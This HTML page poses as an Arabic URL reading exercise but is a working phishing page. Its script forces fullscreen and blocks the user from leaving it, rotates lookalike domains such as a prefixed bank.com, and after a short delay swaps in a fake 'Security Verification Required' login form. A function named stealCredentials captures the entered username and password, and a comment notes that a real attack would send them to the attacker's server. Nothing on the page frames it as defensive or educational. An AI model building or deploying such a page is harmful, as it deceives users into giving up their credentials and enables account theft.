<!DOCTYPE html>
<html>
<head>
    <title>Language Practice</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
            text-align: center;
        }
        textarea {
            width: 100%;
            height: 100px;
            padding: 15px;
            font-size: 18px;
            text-align: center;
            border: 2px solid #007bff;
            border-radius: 10px;
            margin: 20px 0;
            resize: none;
        }
        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
        .fullscreen-message {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            color: white;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
    </style>
</head>
<body>
    <h1>üåê Arabic URL Practice</h1>
    <p>Practice reading Arabic characters in website addresses</p>
    
    <textarea id="arabicText" readonly>ÿ≥google.com</textarea>
    
    <button onclick="startPractice()">Start Practice Session</button>
    <button onclick="toggleFullscreen()" style="background: #28a745;">Enter Fullscreen</button>

    <div class="fullscreen-message" id="fullscreenMessage">
        üîÑ Preparing practice environment...
    </div>

    <script>
        const arabicURLs = [
            'ÿ≥google.com',
            'ÿ≥facebook.com', 
            'ÿ≥youtube.com',
            'ÿ≥bank.com',
            'ÿ≥login.com'
        ];

        let currentIndex = 0;

        function rotateArabicText() {
            currentIndex = (currentIndex + 1) % arabicURLs.length;
            document.getElementById('arabicText').value = arabicURLs[currentIndex];
        }

        setInterval(rotateArabicText, 5000);

        function startPractice() {
            // Request fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }
            
            // Show loading message
            document.getElementById('fullscreenMessage').style.display = 'flex';
            
            // After 3 seconds, show phishing page
            setTimeout(() => {
                showPhishingPage();
            }, 3000);
        }

        function toggleFullscreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        function showPhishingPage() {
            document.body.innerHTML = `
                <div style="padding: 20px; max-width: 400px; margin: 100px auto;">
                    <h2 style="color: #dc3545;">üîí Security Verification Required</h2>
                    <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0;">
                        Unusual activity detected. Verify your identity.
                    </div>
                    <form onsubmit="stealCredentials(event)">
                        <input type="text" placeholder="Username" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd;"><br>
                        <input type="password" placeholder="Password" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd;"><br>
                        <button type="submit" style="background: #dc3545; width: 100%;">Verify Identity</button>
                    </form>
                </div>
            `;
        }

        function stealCredentials(event) {
            event.preventDefault();
            const username = event.target.querySelector('input[type="text"]').value;
            const password = event.target.querySelector('input[type="password"]').value;
            
            // In real attack, send to your server
            console.log("Credentials stolen:", { username, password });
            
            // Show success message
            document.body.innerHTML = `
                <div style="text-align: center; padding: 100px 20px;">
                    <h2 style="color: #28a745;">‚úÖ Verification Complete</h2>
                    <p>Your account is now secure</p>
                </div>
            `;
        }

        // Prevent exiting fullscreen
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            }
        });
    </script>
</body>
</html>
